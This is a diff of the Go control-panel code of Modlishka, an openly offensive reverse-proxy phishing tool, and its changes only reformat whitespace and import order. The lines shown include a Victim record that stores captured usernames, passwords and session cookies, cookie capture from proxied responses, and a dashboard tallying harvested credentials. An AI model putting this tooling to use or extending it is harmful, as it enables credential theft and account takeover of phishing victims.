@@ -21,8 +21,8 @@ import (
 	"flag"
 	"fmt"
 	"github.com/drk1wi/Modlishka/config"
-	"github.com/drk1wi/Modlishka/runtime"
 	"github.com/drk1wi/Modlishka/log"
+	"github.com/drk1wi/Modlishka/runtime"
 	"github.com/tidwall/buntdb"
 	"html/template"
 	"io"
@@ -37,8 +37,8 @@ import (
 
 type ExtendedControlConfiguration struct {
 	*config.Options
-	CredParams *string `json:"credParams"`
-	ControlURL *string `json:"ControlURL"`
+	CredParams   *string `json:"credParams"`
+	ControlURL   *string `json:"ControlURL"`
 	ControlCreds *string `json:"ControlCreds"`
 }
 
@@ -238,10 +238,10 @@ var cookietemplate = `<!DOCTYPE html>
 `
 
 type Victim struct {
-	UUID     string
-	Username string
-	Password string
-	Session  string
+	UUID       string
+	Username   string
+	Password   string
+	Session    string
 	Terminated bool
 }
 
@@ -249,15 +249,15 @@ type Cookie struct {
 	Name  string `json:"name"`
 	Value string `json:"value"`
 
-	Path       string `json:"path"`
-	Domain     string `json:"domain"`
+	Path       string    `json:"path"`
+	Domain     string    `json:"domain"`
 	Expires    time.Time `json:"expire"`
-	RawExpires string 
+	RawExpires string
 
 	// MaxAge=0 means no 'Max-Age' attribute specified.
 	// MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
 	// MaxAge>0 means Max-Age attribute present and given in seconds
-	MaxAge   int 
+	MaxAge   int
 	Secure   bool `json:"secure"`
 	HttpOnly bool `json:"httpOnly"`
 	SameSite http.SameSite
@@ -355,15 +355,15 @@ func (victim *Victim) setCookies(cookies []*http.Cookie, url *url.URL) error {
 
 	for _, v := range cookies {
 		c := Cookie{
-			Name:     v.Name,
-			Value:    v.Value,
-			Path:   v.Path,
-			Domain:   v.Domain,
-			Expires:  v.Expires,
-			RawExpires:  v.RawExpires,
-			MaxAge:  v.MaxAge,
-			HttpOnly: v.HttpOnly,
-			Secure:   v.Secure,
+			Name:       v.Name,
+			Value:      v.Value,
+			Path:       v.Path,
+			Domain:     v.Domain,
+			Expires:    v.Expires,
+			RawExpires: v.RawExpires,
+			MaxAge:     v.MaxAge,
+			HttpOnly:   v.HttpOnly,
+			Secure:     v.Secure,
 			SameSite:   v.SameSite,
 		}
 
@@ -607,20 +607,20 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 	data := struct {
-        Victims   []Victim
-        CredsCount int
-        TermCount int
-        CredsPercent float64
-        TermPercent float64
-        URL string
-    }{
-        victims,
-        credsCount,
-        termCount,
-        float64(credsCount) / float64(len(victims)) * 100,
-        float64(termCount) / float64(len(victims)) * 100,
-        CConfig.url,
-    }
+		Victims      []Victim
+		CredsCount   int
+		TermCount    int
+		CredsPercent float64
+		TermPercent  float64
+		URL          string
+	}{
+		victims,
+		credsCount,
+		termCount,
+		float64(credsCount) / float64(len(victims)) * 100,
+		float64(termCount) / float64(len(victims)) * 100,
+		CConfig.url,
+	}
 	t := template.New("modlishka")
 	t, _ = t.Parse(htmltemplate)
 	err := t.Execute(w, data)
@@ -1005,7 +1005,7 @@ func init() {
 	}
 
 	//process HTTP response (responses can arrive in random order)
-	s.HTTPResponse = func(resp *http.Response, context *HTTPContext,buffer *[]byte) {
+	s.HTTPResponse = func(resp *http.Response, context *HTTPContext, buffer *[]byte) {
 
 		cookies := resp.Cookies()
 		// there are new set-cookies
@@ -1043,7 +1043,7 @@ func init() {
 
 	}
 
-	s.TerminateUser = func(userID string){
+	s.TerminateUser = func(userID string) {
 		log.Infof("Invoking control terminate")
 		victim := Victim{UUID: userID, Terminated: true}
 		err := CConfig.updateEntry(&victim)
